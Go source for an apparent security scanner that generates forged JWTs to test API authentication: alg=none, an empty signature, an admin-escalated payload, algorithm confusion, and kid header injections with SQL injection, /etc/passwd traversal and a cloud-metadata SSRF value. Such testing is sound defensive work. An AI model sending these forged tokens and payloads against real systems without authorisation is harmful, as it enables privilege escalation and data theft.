package jwt

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// JWTTestCase represents a single crafted JWT test payload.
type JWTTestCase struct {
	Name        string
	Token       string
	Description string
	ExpectCode  int // expected HTTP status code if server is VULNERABLE (e.g. 200)
}

// GenerateTestCases produces a suite of adversarial JWTs from an original valid token.
func GenerateTestCases(originalToken string) ([]JWTTestCase, error) {
	parsed, err := ParseToken(originalToken)
	if err != nil {
		return nil, err
	}

	var cases []JWTTestCase

	// 1. None algorithm
	noneToken, err := BuildNoneAlgToken(originalToken)
	if err == nil {
		cases = append(cases, JWTTestCase{
			Name:        "JWT None Algorithm",
			Token:       noneToken,
			Description: "Token crafted with alg=none. Server should reject it with 401.",
			ExpectCode:  200,
		})
	}

	// 2. Empty signature
	emptySignature := parsed.Parts[0] + "." + parsed.Parts[1] + "."
	cases = append(cases, JWTTestCase{
		Name:        "JWT Empty Signature",
		Token:       emptySignature,
		Description: "Token with empty signature. Server should reject it with 401.",
		ExpectCode:  200,
	})

	// 3. Tampered payload — escalate role/admin
	tamperedClaims := cloneMap(parsed.Claims)
	tamperedClaims["role"] = "admin"
	tamperedClaims["is_admin"] = true
	tamperedClaims["sub"] = "0"
	claimsJSON, _ := json.Marshal(tamperedClaims)
	tamperedPayload := base64.RawURLEncoding.EncodeToString(claimsJSON)
	tamperedToken := parsed.Parts[0] + "." + tamperedPayload + "." + parsed.Parts[2]
	cases = append(cases, JWTTestCase{
		Name:        "JWT Tampered Payload (Privilege Escalation)",
		Token:       tamperedToken,
		Description: "Payload modified to set role=admin. Server should reject with 401 (signature invalid).",
		ExpectCode:  200,
	})

	// 4. Expired token (set exp to past)
	expiredClaims := cloneMap(parsed.Claims)
	expiredClaims["exp"] = time.Now().Add(-24 * time.Hour).Unix()
	expiredJSON, _ := json.Marshal(expiredClaims)
	expiredPayload := base64.RawURLEncoding.EncodeToString(expiredJSON)
	// keep original header & signature (signature will be invalid, but we test exp validation)
	expiredToken := parsed.Parts[0] + "." + expiredPayload + "." + parsed.Parts[2]
	cases = append(cases, JWTTestCase{
		Name:        "JWT Expired Token Replay",
		Token:       expiredToken,
		Description: "Expired token sent to API. Server should return 401.",
		ExpectCode:  200,
	})

	// 5. kid header injection attempts
	kidInjections := []struct {
		Name  string
		Value string
	}{
		{"JWT kid SQL Injection", "' UNION SELECT 1,2,3--"},
		{"JWT kid Path Traversal", "../../../etc/passwd"},
		{"JWT kid SSRF", "http://169.254.169.254/latest/meta-data/"},
	}
	for _, inj := range kidInjections {
		headerMap := map[string]interface{}{
			"alg": parsed.Header.Algorithm,
			"typ": "JWT",
			"kid": inj.Value,
		}
		headerJSON, _ := json.Marshal(headerMap)
		headerEncoded := base64.RawURLEncoding.EncodeToString(headerJSON)
		injToken := headerEncoded + "." + parsed.Parts[1] + "." + parsed.Parts[2]
		cases = append(cases, JWTTestCase{
			Name:        inj.Name,
			Token:       injToken,
			Description: fmt.Sprintf("kid header set to '%s'. Server should reject with 401/400.", inj.Value),
			ExpectCode:  200,
		})
	}

	// 6. Algorithm confusion: RS256 → HS256
	algConfusionHeader := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
	}
	algHeaderJSON, _ := json.Marshal(algConfusionHeader)
	algHeaderEncoded := base64.RawURLEncoding.EncodeToString(algHeaderJSON)
	algConfusionToken := algHeaderEncoded + "." + parsed.Parts[1] + ".invalidsig"
	cases = append(cases, JWTTestCase{
		Name:        "JWT Algorithm Confusion (RS256→HS256)",
		Token:       algConfusionToken,
		Description: "Header changed from RS256 to HS256. Server should reject — algorithm must be enforced server-side.",
		ExpectCode:  200,
	})

	// 7. Blank token
	cases = append(cases, JWTTestCase{
		Name:        "JWT Missing Token",
		Token:       "",
		Description: "No Authorization header sent. Protected endpoints should return 401.",
		ExpectCode:  200,
	})

	// 8. Malformed token (random garbage)
	cases = append(cases, JWTTestCase{
		Name:        "JWT Malformed Token",
		Token:       "not.a.validjwt.atall",
		Description: "Completely malformed token sent. Server should return 401/400.",
		ExpectCode:  200,
	})

	return cases, nil
}

// cloneMap performs a shallow clone of a JWTClaims map.
func cloneMap(m JWTClaims) JWTClaims {
	out := make(JWTClaims, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// ExtractTokenFromHeader parses a raw Authorization header value.
func ExtractTokenFromHeader(authHeader string) string {
	authHeader = strings.TrimSpace(authHeader)
	if strings.HasPrefix(authHeader, "Bearer ") {
		return strings.TrimPrefix(authHeader, "Bearer ")
	}
	return authHeader
}
